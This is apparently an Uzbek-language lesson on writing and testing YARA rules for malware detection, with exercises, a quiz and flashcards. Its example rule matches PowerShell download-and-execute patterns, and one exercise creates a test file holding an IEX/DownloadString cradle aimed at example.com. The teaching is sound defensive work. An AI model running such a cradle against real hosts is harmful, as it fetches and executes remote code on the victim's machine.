Tahdid razvedkasi darsidagi kampaniya davom etmoqda. Hujumchi har gal faylini biroz o'zgartiradi — xeshi har safar yangi, va xesh ro'yxatlari doim bir qadam orqada qoladi. Lekin fayllarning ichiga qarasangiz, ularda doim bir xil narsalar bor: bir xil matnli satrlar, bir xil kod bo'laklari, bir xil yashirin manzil yozish usuli.

Agar "**ichida shu satrlar bo'lgan har qanday faylni top**" deb ayta olsangiz-chi? Xesh o'zgaradi — satrlar qoladi. Pyramid of Pain'da xeshdan **vositalar** darajasiga ko'tarilasiz.

Buning uchun **YARA** bor — xavfsizlik tadqiqotchilarining "zararli dastur uchun regex"i.

## YARA nima

[[yara|YARA]] — fayllar (yoki jarayon xotirasi) ichidan **matn va bayt naqshlari** asosida narsalarni topish uchun qoidalar tili va vosita. U VirusTotal jamoasi tomonidan yaratilgan va bugun deyarli butun soha ishlatadi:

| Qayerda | Qanday |
|---|---|
| **Tahlilchilar** | Namunani tasniflash: "bu fayl qaysi oilaga tegishli?" |
| **IR jamoalari** | Yuzlab qurilmalarda bir xil zararli faylni qidirish |
| **EDR va antiviruslar** | Ichki aniqlash dvigatellarining bir qismi |
| **Pochta shlyuzlari** | Ilovalarni tekshirish |
| **VirusTotal** | Yangi yuklangan fayllarni qoidalar bilan avtomatik ovlash |
| **Xotira forensikasi** | Jarayon xotirasidan qidirish (keyingi bosqich) |

Sigma darsidagi taqqoslashni eslang: **Sigma** — loglar uchun, **Suricata** — tarmoq uchun, **YARA** — fayllar va xotira uchun.

## Qoida tuzilishi

```
rule Shubhali_PowerShell_Yuklovchi
{
    meta:
        author      = "KiberAkademiya o'quvchisi"
        description = "Internetdan kod yuklab, xotirada ishga tushiradigan PowerShell skriptlari"
        date        = "2026-11-16"
        reference   = "Ichki insident 2026-11-16"

    strings:
        $yuklash1 = "DownloadString" ascii wide nocase
        $yuklash2 = "DownloadData" ascii wide nocase
        $ishga    = "IEX" ascii wide fullword
        $ishga2   = "Invoke-Expression" ascii wide nocase
        $dekod    = "FromBase64String" ascii wide nocase

    condition:
        filesize < 200KB and
        1 of ($yuklash*) and
        1 of ($ishga*) and
        $dekod
}
```

Uch bo'lim:

| Bo'lim | Majburiymi | Vazifasi |
|---|---|---|
| `meta` | Yo'q, lekin yozing | Qoida haqida ma'lumot: muallif, tavsif, sana, manba |
| `strings` | Yo'q | Qidiriladigan naqshlar; har biri `$` bilan boshlanadi |
| `condition` | **Ha** | Qachon qoida "mos keldi" deb hisoblanadi |

Bu qoida nima deydi: "200 KB dan kichik, internetdan yuklash funksiyasi **va** ishga tushirish buyrug'i **va** Base64 dekodlash bor fayl." Har bir satr alohida — qonuniy skriptlarda ham uchraydi. Uchalasi birgalikda kichik faylda — kuchliroq signal. Detection engineering darsidagi "bitta belgi — gumon, bir nechtasi — dalil" tamoyili.

## Satrlar (strings)

### Matnli satrlar va modifikatorlar

```
$a = "DownloadString"                    // aniq matn, ASCII
$b = "DownloadString" nocase             // katta-kichik harf farqsiz
$c = "DownloadString" wide               // UTF-16 (Windows dasturlari ichida ko'p)
$d = "DownloadString" ascii wide         // ikkalasi ham
$e = "IEX" fullword                      // faqat alohida so'z sifatida ("IEXplore" emas)
```

`wide` muhim: kodlash bosqichidan eslaysiz — Windows ko'p satrlarni UTF-16 formatida saqlaydi, ya'ni har bir harfdan keyin nol bayt (`D\0o\0w\0n\0…`). `wide` bo'lmasa, YARA ularni ko'rmaydi.

| Modifikator | Ma'nosi |
|---|---|
| `ascii` | Oddiy bir baytli matn (standart) |
| `wide` | UTF-16 (har harfdan keyin nol bayt) |
| `nocase` | Katta-kichik harf farqlanmaydi |
| `fullword` | Atrofida harf yoki raqam bo'lmasligi kerak |
| `xor` | Oddiy XOR bilan yashirilgan matnni ham topadi |
| `base64` | Base64 ichida kodlangan matnni ham topadi |

### Hex satrlar

Matn bo'lmagan baytlar uchun — o'n oltilik ko'rinish (kompyuter bosqichidagi hex):

```
$mz     = { 4D 5A }                       // "MZ" — Windows dasturi boshi (magic bytes)
$jok    = { 4D 5A ?? ?? 50 45 }           // ?? — istalgan bitta bayt
$sakrash = { 6A 40 [2-4] 68 00 30 00 00 } // [2-4] — 2 dan 4 gacha istalgan bayt
$tanlov = { 4D 5A ( 90 | 50 ) 00 }        // ( | ) — muqobillar
```

Kompyuter bosqichidagi **magic bytes** darsini eslang: `MZ` (`4D 5A`) — Windows bajariladigan fayllarining boshi. Shu bilan fayl turi kengaytmaga qaramay aniqlanadi.

### Regex

```
$url = /https?:\/\/[a-z0-9.-]+\/[a-z0-9]{1,8}\.ps1/ nocase
```

Regex kuchli, lekin sekin. Katta fayl to'plamlarida ehtiyotkorlik bilan, iloji boricha matnli satrlar bilan birga ishlating.

## Shartlar (condition)

| Yozuv | Ma'nosi |
|---|---|
| `$a` | `$a` topildi |
| `$a and $b`, `$a or $b`, `not $a` | Mantiqiy amallar |
| `any of them` | Istalgan bitta satr |
| `all of them` | Barcha satrlar |
| `2 of ($s*)` | `$s` bilan boshlanadiganlardan kamida 2 tasi |
| `#a > 5` | `$a` 5 martadan ko'p uchraydi |
| `$mz at 0` | `$mz` aynan fayl boshida (0-pozitsiya) |
| `$a in (0..1024)` | Birinchi 1024 bayt ichida |
| `filesize < 2MB` | Fayl hajmi sharti |
| `uint16(0) == 0x5A4D` | Fayl boshidagi 2 bayt "MZ" (teskari tartibda o'qiladi) |

Oxirgi qatorga e'tibor bering: `4D 5A` baytlari `uint16` sifatida o'qilganda `0x5A4D` bo'ladi — chunki Intel protsessorlari ko'p baytli sonlarni **kichik bayt birinchi** (little-endian) tartibida saqlaydi. Bu YARA qoidalarida juda ko'p uchraydigan naqsh: "bu Windows dasturimi?"

## Modullar

YARA modullari fayl **tuzilishini** tushunadi — faqat baytlarni emas:

```
import "pe"
import "math"

rule Imzosiz_Kichik_Dastur_Yuqori_Entropiya
{
    meta:
        description = "Kichik, imzosiz, ichi siqilgan yoki shifrlangan bo'lishi mumkin bo'lgan Windows dasturi"
    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        pe.number_of_signatures == 0 and
        math.entropy(0, filesize) > 7.2
}
```

| Modul | Nimani beradi |
|---|---|
| `pe` | Windows dasturi tuzilishi: bo'limlar, import qilingan funksiyalar, imzolar, kompilyatsiya vaqti |
| `elf` | Linux dasturlari tuzilishi |
| `math` | Entropiya va boshqa hisob-kitoblar |
| `hash` | Fayl yoki uning qismi xeshi |

**Entropiya** — ma'lumotning "tasodifiylik" o'lchovi (0 dan 8 gacha bayt uchun). Oddiy matn — past entropiya; siqilgan yoki shifrlangan ma'lumot — 8 ga yaqin. Kriptografiya darsidagi "yaxshi shifrlangan matn tasodifiy shovqindan farq qilmaydi" fikrini eslang. Yuqori entropiya o'zi zararli emas (ZIP arxivlar ham shunday), lekin boshqa belgilar bilan birga — signal.

## YARA'ni ishga tushirish

```bash
# O'rnatish (Ubuntu)
sudo apt install yara

# Bitta faylni tekshirish
yara qoida.yar shubhali_fayl.bin

# Papkani rekursiv tekshirish
yara -r qoida.yar /home/foydalanuvchi/Downloads/

# Qaysi satrlar mos kelganini ko'rsatish
yara -s qoida.yar shubhali_fayl.bin

# Meta ma'lumotni ham chiqarish
yara -m qoida.yar shubhali_fayl.bin

# Bir faylda bir nechta qoida
yara -r barcha_qoidalar.yar /namuna/papka/
```

Natija oddiy: mos kelgan qoida nomi va fayl yo'li. `-s` bilan — qaysi satr qayerda topilgani:

```
Shubhali_PowerShell_Yuklovchi ./namuna/a.ps1
0x1f2:$yuklash1: DownloadString
0x248:$ishga: IEX
0x31a:$dekod: FromBase64String
```

Python'da ishlatish uchun `yara-python` kutubxonasi bor (dasturlash bosqichidagi Python bilimingiz bilan avtomatlashtirish mumkin). Yangi avlod — **YARA-X** — Rust'da qayta yozilgan, tezroq va qat'iyroq; mavjud qoidalarning ko'pchiligi u bilan ishlaydi.

## Yaxshi qoida yozish

### Qanday satrlarni tanlash kerak

| Yomon satr | Nega | Yaxshi satr |
|---|---|---|
| `"kernel32.dll"` | Deyarli barcha Windows dasturlarida bor | Dasturga xos xato xabari yoki noyob matn |
| `"http://"` | Har joyda | Noyob URL yo'li naqshi |
| `"This program cannot be run in DOS mode"` | Har bir Windows dasturida | Muallifning o'ziga xos yozuvi, imlo xatosi bilan |
| Bitta qisqa satr (`"cmd"`) | Juda ko'p mos keladi | Bir nechta o'rtacha noyob satr birgalikda |

Eng yaxshi satrlar — **muallif o'zgartirishni unutadigan** narsalar: o'ziga xos xato xabarlari, imlo xatolari, ichki o'zgaruvchi nomlari, noodatiy kalit so'zlar kombinatsiyasi, maxsus kod bo'laklari.

### Sinash — ikki yo'nalishda

Detection engineering darsidagi qoida bu yerda ham amal qiladi:

1. **Ishlaydimi?** Qoida tegishli namunalarni topadimi? (Namunalar — faqat izolyatsiyalangan laboratoriyada.)
2. **Shovqin bormi?** Qoidani **toza fayllar to'plami** ustida ishga tushiring: masalan, toza Windows'dagi `C:\Windows\System32\` va `C:\Program Files\`. Birorta mos kelish bo'lsa — qoida juda keng.

```bash
# Laboratoriya VM'ida: qoida toza tizim fayllarida jim turadimi?
yara -r qoida.yar /mnt/windows/Windows/System32/ 2>/dev/null | head
```

Bo'sh natija — yaxshi belgi. Mos kelish bo'lsa — qaysi satr sabab bo'lganini `-s` bilan ko'ring va shartni qattiqlashtiring.

### Yaxshi amaliyotlar

- **Tuzilish + mazmun:** `uint16(0) == 0x5A4D and filesize < 1MB and …` — avval fayl turini va hajmini cheklang; bu ham tezlik, ham aniqlik.
- **`meta` ni to'ldiring:** muallif, sana, tavsif, manba (hash yoki hisobot) — bir yildan keyin hamkasbingiz (yoki o'zingiz) rahmat aytadi.
- **Nomlash:** qoida nomi nima topishini aytsin.
- **Versiyalash:** qoidalar ham Git'da (detection-as-code).

:::key
YARA qoidasi — **gipoteza**, isbot emas. "Bu fayl qoidaga mos keldi" — "bu fayl zararli" degani emas, balki "bu fayl siz qidirgan naqshga ega" degani. Keng qoida qonuniy dasturlarni ham topadi; tor qoida esa hujumchi bitta satrni o'zgartirganda jim qoladi. Shuning uchun YARA natijasi — triage boshlanishi: keyin xesh, tarqalganlik, imzo, xulq (EDR darsi) bilan tasdiqlanadi.
:::

## Tayyor qoidalar

| Manba | Nima |
|---|---|
| **YARA-Rules** loyihasi (GitHub) | Hamjamiyat qoidalari to'plami |
| **Florian Roth — signature-base** | Sifatli, yaxshi hujjatlangan qoidalar; Loki va THOR skanerlarida ishlatiladi |
| **Elastic — protections-artifacts** | Elastic Defend'da ishlatiladigan ochiq qoidalar |
| **abuse.ch YARAify** | Qoidalar va namunalarni skanerlash xizmati |
| Xavfsizlik kompaniyalari hisobotlari | Ko'pincha hisobot oxirida YARA qoidalari beriladi |

Sigma darsidagi kabi: tayyor qoidalarni o'rganing — tajribali tahlilchilar qanday fikrlashini ko'rasiz. Lekin hammasini o'ylamasdan ishlatmang: ba'zilari keng va shovqinli.

**Loki** (bepul) va **THOR** (tijoriy) — YARA va boshqa IOC'lar bilan butun tizimni tekshiradigan IR skanerlari. Velociraptor (EDR darsi) ham YARA bilan ko'p qurilmani bir vaqtda skanerlay oladi.

## YARA nimani qilmaydi

- **Xatti-harakatni ko'rmaydi** — u statik naqshlarni qidiradi; fayl nima **qilishini** bilmaydi.
- **Shifrlangan yoki siqilgan ichni ko'rmaydi** — qadoqlangan (packed) faylda haqiqiy satrlar yashirin bo'ladi (xotirada esa ochilgan holda — shuning uchun xotira skanerlash).
- **O'zi zararli/zararsiz qaror qilmaydi** — natija tahlil va tasdiqni talab qiladi.
- **Mo'rt bo'lishi mumkin** — faqat bitta satrga tayangan qoida osonlik bilan aylanib o'tiladi.
- **Tez emas, agar yomon yozilsa** — regex va qisqa satrlar katta to'plamlarda sekinlashtiradi.

:::try
Barcha mashqlar **o'z laboratoriyangizda**; haqiqiy zararli namunalar kerak emas.

**1. Birinchi qoida.** Ikki test fayli yarating:

```bash
mkdir yara-mashq && cd yara-mashq
echo 'Write-Host "Salom"' > toza.ps1
echo '$x = [Convert]::FromBase64String("..."); IEX (New-Object Net.WebClient).DownloadString("http://example.com/a")' > shubhali.ps1
```

Darsdagi `Shubhali_PowerShell_Yuklovchi` qoidasini `qoida.yar` fayliga yozing va `yara -s qoida.yar .` bilan ishga tushiring. Qaysi fayl mos keldi? Qaysi satrlar topildi?

**2. Shartni o'zgartiring.** `condition` ni `any of them` ga o'zgartiring. Natija o'zgardimi? Endi `all of them` qiling — nega hech narsa topilmadi?

**3. Magic bytes.** Laboratoriya VM'ida istalgan Windows dasturini (masalan, nusxalangan `notepad.exe`) va bitta matn faylini oling. `uint16(0) == 0x5A4D` sharti bilan faqat Windows dasturlarini topadigan qoida yozing. Keyin dasturning nomini `rasm.jpg` ga o'zgartiring — qoida baribir topadimi?

**4. Shovqin testi.** Laboratoriya VM'ida 1-mashqdagi qoidani `C:\Windows\System32\WindowsPowerShell\` papkasida ishga tushiring. Mos kelish bormi? Agar bo'lsa — nega, va qoidani qanday qattiqlashtirish mumkin?

**5. TryHackMe** — "Yara" xonasini bajaring.

*Javoblar: 1 — faqat `shubhali.ps1`; `$yuklash1`, `$ishga` va `$dekod` topiladi. 2 — `any of them` bilan natija bir xil qoladi (toza faylda hech qaysi satr yo'q); `all of them` — `DownloadData` va `Invoke-Expression` faylda yo'q, shuning uchun mos kelmaydi. 3 — ha: YARA fayl nomiga emas, mazmuniga qaraydi. 4 — PowerShell modullari va yordam fayllarida bu so'zlar uchrashi mumkin; qattiqlashtirish uchun — hajm chegarasi, qo'shimcha noyob satrlar yoki satrlar sonini oshirish.*
:::

## Xulosa

- **YARA** — fayl va xotiradan matn va bayt naqshlarini qidirish uchun qoidalar tili; xeshdan mustahkamroq (Pyramid of Pain'da — vositalar darajasi).
- Qoida: `meta` (ma'lumot), `strings` (naqshlar), `condition` (majburiy).
- Satrlar: matn (`ascii`, `wide`, `nocase`, `fullword`, `xor`, `base64`), hex (`??`, `[2-4]`, `( | )`), regex.
- Shartlar: `any/all of them`, `2 of ($s*)`, `#a > 5`, `$mz at 0`, `filesize`, `uint16(0) == 0x5A4D`.
- Modullar: `pe`, `elf`, `math` (entropiya), `hash`.
- Ishga tushirish: `yara -r -s qoida.yar papka/`.
- Yaxshi qoida: **noyob satrlar + tuzilish sharti**; namunalarda va **toza fayllarda** sinash.
- YARA natijasi — gipoteza; xulq, tarqalganlik va imzo bilan tasdiqlanadi.

:::quiz
? YARA nima uchun ishlatiladi?
- Tarmoq trafigini bloklash uchun
+ Fayl va xotiradan matn va bayt naqshlari bo'yicha narsalarni topish uchun
- Loglarni SIEM'ga yuborish uchun
- Parollarni shifrlash uchun
! Sigma — loglar, Suricata — tarmoq, YARA — fayllar va xotira uchun.

? YARA qoidasining qaysi bo'limi majburiy?
- meta
- strings
+ condition
- import
! condition'siz qoida bo'lmaydi; meta va strings ixtiyoriy (lekin deyarli har doim yoziladi).

? Nega Windows dasturlarida satr qidirishda wide modifikatori muhim?
- U qidiruvni tezlashtiradi
+ Windows ko'p satrlarni UTF-16 da saqlaydi — har harfdan keyin nol bayt; wide bo'lmasa ular topilmaydi
- U fayl hajmini kamaytiradi
- U faqat Linux uchun
! ascii wide — ikkala kodlashni ham qidirish uchun.

? Hex satrdagi ?? nimani bildiradi?
+ Istalgan bitta bayt
- Fayl oxiri
- Ikki xil bayt
- Xato
! [2-4] esa 2 dan 4 gacha istalgan baytlar sakrashi, ( 90 | 50 ) — muqobillar.

? uint16(0) == 0x5A4D sharti nimani tekshiradi?
- Fayl hajmini
+ Fayl boshida “MZ” baytlari borligini — ya'ni Windows dasturi ekanini
- Fayl nomini
- Fayl imzosini
! 4D 5A baytlari little-endian tartibida uint16 sifatida 0x5A4D bo'lib o'qiladi.

? 2 of ($s*) sharti nimani bildiradi?
- Faqat ikkinchi satr
+ $s bilan boshlanadigan satrlardan kamida ikkitasi topilishi kerak
- Barcha satrlar ikki marta
- Ikki fayl
! Bir nechta belgining birgalikda bo'lishini talab qilish qoidani aniqroq qiladi.

? Qaysi satr YARA qoidasi uchun eng yomon tanlov?
+ "kernel32.dll"
- Muallifga xos imlo xatoli xato xabari
- Noyob ichki o'zgaruvchi nomi
- Noodatiy kalit so'zlar kombinatsiyasi
! kernel32.dll deyarli barcha Windows dasturlarida bor — qoida minglab qonuniy faylni topadi.

? YARA qoidasini sinashning ikki yo'nalishi qaysi?
+ Tegishli namunalarni topishini tekshirish (laboratoriyada)
+ Toza fayllar to'plamida jim turishini tekshirish
- Faqat sintaksis xatolarini tekshirish
- Qoidani darhol barcha qurilmalarda ishlatish
! Qoida ham kerakli narsani topishi, ham qonuniy fayllarni bezovta qilmasligi kerak.

? Yuqori entropiya (masalan, 7.5) nimani ko'rsatadi?
- Fayl albatta zararli
+ Ma'lumot siqilgan yoki shifrlangan bo'lishi mumkin — boshqa belgilar bilan birga signal
- Fayl bo'sh
- Fayl matnli hujjat
! ZIP va rasmlar ham yuqori entropiyaga ega; entropiya o'zi hukm emas.

? Fayl YARA qoidasiga mos keldi. To'g'ri xulosa qaysi?
- Fayl albatta zararli — darhol barcha qurilmalardan o'chirish kerak
+ Fayl qidirilgan naqshga ega — xesh, tarqalganlik, imzo va xulq bilan tasdiqlash kerak
- Qoida noto'g'ri
- Hech narsa qilish kerak emas
! YARA natijasi — gipoteza va triage boshlanishi.

? Nega qadoqlangan (packed) faylda YARA satrlarni topa olmasligi mumkin?
- YARA bunday fayllarni ochmaydi
+ Haqiqiy satrlar siqilgan yoki shifrlangan holda yashiringan; ular faqat xotirada ochiladi
- Qadoqlangan fayllar bo'sh
- Bu faqat Linux'da bo'ladi
! Shuning uchun xotira skanerlash va xulq tahlili muhim.
:::

:::cards
YARA nima? :: Fayl va xotiradan matn va bayt naqshlari asosida narsalarni topish uchun qoidalar tili va vosita.
YARA qoidasi bo'limlari? :: meta (ma'lumot), strings (naqshlar), condition (majburiy — qachon mos keladi).
Matnli satr modifikatorlari? :: ascii, wide (UTF-16), nocase, fullword, xor, base64.
Hex satr belgilari? :: ?? — istalgan bayt; [2-4] — 2–4 bayt sakrash; ( 90 | 50 ) — muqobillar.
Asosiy shartlar? :: any of them, all of them, 2 of ($s*), #a > 5, $mz at 0, filesize < 2MB.
uint16(0) == 0x5A4D? :: Fayl boshida MZ baytlari — Windows dasturi; little-endian tufayli 4D 5A teskari o'qiladi.
YARA modullari? :: pe (Windows dasturi tuzilishi), elf (Linux), math (entropiya), hash.
Entropiya nima? :: Ma'lumot tasodifiyligi o'lchovi (0–8); siqilgan yoki shifrlangan ma'lumotda 8 ga yaqin.
YARA'ni ishga tushirish? :: yara qoida.yar fayl; -r rekursiv, -s topilgan satrlar, -m meta.
Yaxshi satr qanday? :: Noyob, muallif o'zgartirishni unutadigan: o'ziga xos xato xabarlari, imlo xatolari, ichki nomlar.
YARA qoidasini qanday sinash kerak? :: Laboratoriyadagi tegishli namunalarda topishi va toza fayllar to'plamida (System32, Program Files) jim turishi.
YARA cheklovlari? :: Xatti-harakatni ko'rmaydi, qadoqlangan fayllar ichini ko'rmaydi, natija — gipoteza, mo'rt bo'lishi mumkin.
:::
